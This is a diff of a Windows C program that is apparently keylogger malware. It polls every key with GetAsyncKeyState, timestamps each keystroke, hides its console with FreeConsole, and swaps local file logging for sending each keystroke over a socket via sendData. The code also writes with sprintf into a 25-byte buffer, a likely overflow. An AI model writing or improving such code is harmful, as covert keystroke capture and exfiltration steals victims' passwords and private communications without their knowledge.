@@ -4,15 +4,16 @@
 int main(){
 
 	LPCSTR filename = "logs.txt";
-	FILE* fp;
+	// FILE* fp;
 
 	bool flagSpecialKey = false;
 
-	//FreeConsole();
+	FreeConsole();
 	int isResult = initSocket();
 
 	if (isResult < 0) {
 		printf("Some error Occured...!\n");
+		system("PAUSE");
 		return -1;
 	}
 
@@ -21,14 +22,14 @@ int main(){
 	while (true) {
 
 		Sleep(10);
-		fp = fopen(filename, "a+");
+		//fp = fopen(filename, "a+");
 		for (short i = 0; i < 256; i++) {
 
 			if (GetAsyncKeyState(i) == -32767) {
 
 				time_t now = time(0);
 				char* dt = ctime(&now);
-				char subbuff[25];
+				char subbuff[25] = "";
 				memcpy(subbuff, &dt[0], 24);
 				subbuff[24] = '\0';
 
@@ -136,9 +137,7 @@ int main(){
 					break;
 				default:
 					if (!flagSpecialKey) {
-						//fprintf(fp, "%s : ", subbuff);
-						//fprintf(fp, "%c\n", i);
-						
+
 						sprintf(subbuff, "%s%s%c\n",subbuff, " : ", i);
 						sendData(subbuff);
 
@@ -150,13 +149,12 @@ int main(){
 				}
 				
 				if (flagSpecialKey) {
-					//fprintf(fp, "%s\n", subbuff);
 					sendData(subbuff);
 					flagSpecialKey = false;
 				}
 			}
 		}
-		fclose(fp);
+		//fclose(fp);
 		
 	}
 	
